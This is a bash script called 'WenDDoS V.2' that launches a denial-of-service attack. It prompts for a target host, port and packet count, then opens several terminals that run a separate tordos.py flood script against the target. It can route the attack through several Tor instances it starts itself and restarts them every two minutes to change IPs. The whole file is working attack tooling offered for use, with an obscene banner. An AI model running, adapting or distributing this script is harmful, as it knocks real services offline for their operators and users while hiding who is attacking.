#!/bin/bash
# DDoS Tool "WenDDoS V.2"
# Script by WenDev89 & Team


trap 'printf "\n";stop;exit 1' 2

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Saran saya, Run as Sudo \n \e[0m"
   exit 1
fi
}

changeip() {


killall -HUP tor

}

banner() {

printf "\e[1;92mY8b Y8b Y888P                 888 88e   888 88e              dP 8\e[0m\n"   
printf "\e[1;92m Y8b Y8b Y8P   ,e e,  888 8e  888 888b  888 888b   e88 88e  C8b Y\e[0m\n"
printf "\e[1;92m  Y8b Y8b Y   d88 88b 888 88b 888 8888D 888 8888D d888 888b  Y8b\e[0m\n"  
printf "\e[1;92m   Y8b Y8b    888   , 888 888 888 888P  888 888P  Y888 888P b Y8D\e[0m\n" 
printf "\e[1;92m    Y8P Y       YeeP  888 888 888 88    888 88      88 88   8edP\e[0m\n"
printf "\e[1;91m     ** SUCK MY DICK!!  DDoS Tool Attack o-[[ WenDDoS V.2 ]]-o\e[0m\n\n"


}

config() {
default_portt="80"
default_threads="600"

default_tor="y"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;93m\e[0;101mTARGET? \e[0m>>> \e[0m' target
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;93m\e[0;101mPORT? \e[0m\e[1;77m(Default: 80) >>> \e[0m' portt
portt="${portt:-${default_portt}}"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;93m\e[0;101mPACKET? \e[0m\e[1;77m(Default: 600) >>> \e[0m' threads
threads="${threads:-${default_threads}}"

inst="${inst:-${default_inst}}"
read -e -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m] Anonymized via Tor? \e[0m\e[1;77m[Y/n]: \e[0m' tor
printf "\e[0m"
tor="${tor:-${default_tor}}"
if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[1;93m[*]\e[0m\e[1;93\e[0;101m Tekan Ctrl + C untuk berhenti \e[0m \n"
attacktor
else
attack
fi
}



readinst() {
default_inst="3"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor instances \e[0m\e[1;77m(default: 3): \e[0m' inst
inst="${inst:-${default_inst}}"
multitor
}


attacktor() {
#let i=1
while true; do
  let ii=1
  while [ $ii -le $inst ]; do
porttor=$((9050+$ii))
#printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
gnome-terminal -- torsocks -P $porttor python tordos/tordos.py -t $target -p $portt -r $threads
ii=$((ii+1))
done
sleep 120
changeip
killall python
let i=1
let porttor=$((9050+$i))
done
}

attack() {
default_inst="4"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Terminals \e[0m\e[1;77m(Default 4): \e[0m' inst
inst="${inst:-${default_inst}}"
printf "\e[1;93m[*]\e[0m\e[1;93\e[0;101m Tekan Ctrl + C untuk berhenti \e[0m \n"
i=1
while true; do
  let i=1
  while [[ $i -le $inst ]]; do

gnome-terminal -- python tordos/tordos.py -t $target -p $portt -r $threads
i=$((i+1))
done
sleep 120
killall python
done
}

checktor() {
let i=1
checkcount=0 
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking Tor connection on port:\e[0m\e[1;77m %s\e[0m..." $port

check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?) 
if [[ "$check" -gt 0 ]]; then 
printf "\e[1;91mFAIL!\e[0m\n" 
else 
printf "\e[1;92mOK!\e[0m\n" 
let checkcount++ 
fi
i=$((i+1))
done

if [[ $checkcount != $inst ]]; then
printf "\e[1;93m[!] Wajib menggunakan Tor!\e[0m\n"
printf "\e[1;77m1) Cek kembali\e[0m\n"
printf "\e[1;77m2) Restart\n\e[0m"
printf "\e[1;77m2) Keluar\n\e[0m"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih: \e[0m' fail  


if [[ $fail == "1" ]]; then
checktor
elif [[ $fail == "2" ]]; then
stop
multitor
elif [[ $fail == "3" ]]; then
exit 1
else
printf "\e[1;93m[!] Invalid option, exiting...!\e[0m\n"
exit 1
fi
fi
}

multitor() {


if [[ ! -d multitor ]]; then 
mkdir multitor;
fi
default_ins="1"
inst="${inst:-${default_inst}}"

let i=1
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i 
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Tor on port:\e[0m\e[1;77m 905%s\e[0m\n" $i 
tor -f multitor/multitor$i > /dev/null &
sleep 10
i=$((i+1))
done
checktor
}

stop() {

killall -2 tor > /dev/null 2>&1
printf "\e[1;92m[*] All Tor connection stopped.\e[0m\n"
}

banner
checkroot
config


